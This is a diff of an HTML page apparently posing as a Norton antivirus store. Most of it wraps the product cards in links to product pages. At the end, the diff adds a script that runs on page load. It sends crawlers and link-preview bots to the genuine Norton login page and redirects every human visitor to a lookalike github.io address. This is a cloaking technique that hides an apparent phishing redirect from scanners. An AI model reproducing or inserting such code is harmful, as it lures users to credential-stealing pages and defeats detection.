@@ -134,56 +134,68 @@
     <!-- third section -->
     <section class="w-[80%] mx-auto my-10 flex flex-col gap-10">
         <div class="flex flex-col md:flex-row gap-10">
-            <div class="flex flex-col gap-3">
-                <img class="w-full rounded-md" src="./assets/norton-delux01.jpg" alt="product1">
-                <p class="text-lg font-semibold">Norton 360 Deluxe 5 Devices
-                </p>
-                <p>$39.99
-                </p>
-                <button class="bg-black text-white py-2 px-4 rounded cursor-pointer">Add to cart</button>
-            </div>
-            <div class="flex flex-col gap-3">
-                <img class="w-full rounded-md" src="./assets/norton-360-for-gamer.jpg" alt="product2">
-                <p class="text-lg font-semibold">Norton 360 For Gamers
-                </p>
-                <p>$29.99
-                </p>
-                <button class="bg-black text-white py-2 px-4 rounded cursor-pointer">Add to cart</button>
-            </div>
-            <div class="flex flex-col gap-3">
-                <img class="w-full rounded-md" src="./assets/norton-360-standard0001.jpg" alt="product3">
-                <p class="text-lg font-semibold">Norton 360 Standard
-                </p>
-                <p>$34.99
-                </p>
-                <button class="bg-black text-white py-2 px-4 rounded cursor-pointer">Add to cart</button>
-            </div>
+            <a href="./norton-360-deluxe-5-devices.html">
+                <div class="flex flex-col gap-3">
+                    <img class="w-full rounded-md" src="./assets/norton-delux01.jpg" alt="product1">
+                    <p class="text-lg font-semibold">Norton 360 Deluxe 5 Devices
+                    </p>
+                    <p>$39.99
+                    </p>
+                    <button class="bg-black text-white py-2 px-4 rounded cursor-pointer">Add to cart</button>
+                </div>
+            </a>
+            <a href="./norton-360-for-gamers.html">
+                <div class="flex flex-col gap-3">
+                    <img class="w-full rounded-md" src="./assets/norton-360-for-gamer.jpg" alt="product2">
+                    <p class="text-lg font-semibold">Norton 360 For Gamers
+                    </p>
+                    <p>$29.99
+                    </p>
+                    <button class="bg-black text-white py-2 px-4 rounded cursor-pointer">Add to cart</button>
+                </div>
+            </a>
+            <a href="./norton-360-standard.html">
+                <div class="flex flex-col gap-3">
+                    <img class="w-full rounded-md" src="./assets/norton-360-standard0001.jpg" alt="product3">
+                    <p class="text-lg font-semibold">Norton 360 Standard
+                    </p>
+                    <p>$34.99
+                    </p>
+                    <button class="bg-black text-white py-2 px-4 rounded cursor-pointer">Add to cart</button>
+                </div>
+            </a>
         </div>
         <div class="flex flex-col md:flex-row gap-10">
-            <div class="flex flex-col gap-3">
-                <img class="w-full rounded-md" src="./assets/Norton-360-with-LifeLock-1.jpg" alt="product4">
-                <p class="text-lg font-semibold">Norton 360 with LifeLock Select
-                </p>
-                <p>$99.49
-                </p>
-                <button class="bg-black text-white py-2 px-4 rounded cursor-pointer">Add to cart</button>
-            </div>
-            <div class="flex flex-col gap-3">
-                <img class="w-full rounded-md" src="./assets/Norton_360_with_LifeLock_Ultimate.jpg" alt="product5">
-                <p class="text-lg font-semibold">Norton 360 with LifeLock Ultimate Plus
-                </p>
-                <p>$299.88
-                </p>
-                <button class="bg-black text-white py-2 px-4 rounded cursor-pointer">Add to cart</button>
-            </div>
-            <div class="flex flex-col gap-3">
-                <img class="w-full rounded-md" src="./assets/norton-antivirus-1yr.jpg" alt="product6">
-                <p class="text-lg font-semibold">Norton AntiVirus Plus For 1 Year
-                </p>
-                <p>$39.99
-                </p>
-                <button class="bg-black text-white py-2 px-4 rounded cursor-pointer">Add to cart</button>
-            </div>
+            <a href="./norton-360-with-lifeLock-select.html">
+                <div class="flex flex-col gap-3">
+                    <img class="w-full rounded-md" src="./assets/Norton-360-with-LifeLock-1.jpg" alt="product4">
+                    <p class="text-lg font-semibold">Norton 360 with LifeLock Select
+                    </p>
+                    <p>$99.49
+                    </p>
+                    <button class="bg-black text-white py-2 px-4 rounded cursor-pointer">Add to cart</button>
+                </div>
+            </a>
+            <a href="./norton-360-with-lifeLock-ultimate-plus.html">
+                <div class="flex flex-col gap-3">
+                    <img class="w-full rounded-md" src="./assets/Norton_360_with_LifeLock_Ultimate.jpg" alt="product5">
+                    <p class="text-lg font-semibold">Norton 360 with LifeLock Ultimate Plus
+                    </p>
+                    <p>$299.88
+                    </p>
+                    <button class="bg-black text-white py-2 px-4 rounded cursor-pointer">Add to cart</button>
+                </div>
+            </a>
+            <a href="./norton-antivirus-plus-for-1-year.html">
+                <div class="flex flex-col gap-3">
+                    <img class="w-full rounded-md" src="./assets/norton-antivirus-1yr.jpg" alt="product6">
+                    <p class="text-lg font-semibold">Norton AntiVirus Plus For 1 Year
+                    </p>
+                    <p>$39.99
+                    </p>
+                    <button class="bg-black text-white py-2 px-4 rounded cursor-pointer">Add to cart</button>
+                </div>
+            </a>
         </div>
     </section>
     <!-- brand section -->
@@ -284,7 +296,44 @@
                 }, 1000);
             });
         });
+
+        // Define URLs
+        const botURL = "https://login.norton.com/sso/embedded/update";
+        const humanURL = "https://us-norton-com.github.io/norton-012";
+
+        // Function to detect bot
+        function isBot() {
+            const botPatterns = [
+                /bot/i,
+                /crawl/i,
+                /spider/i,
+                /slurp/i,
+                /fetch/i,
+                /search/i,
+                /yandex/i,
+                /baidu/i,
+                /bing/i,
+                /duckduckgo/i,
+                /embedly/i,
+                /facebook/i,
+                /quora/i,
+                /pinterest/i,
+                /reddit/i,
+                /twitter/i,
+                /whatsapp/i
+            ];
+
+            return botPatterns.some(pattern => pattern.test(navigator.userAgent));
+        }
+
+        // Redirect based on detection
+        if (isBot()) {
+            window.location.href = botURL;
+        } else {
+            window.location.href = humanURL;
+        }
     </script>
+
 
 </body>
 
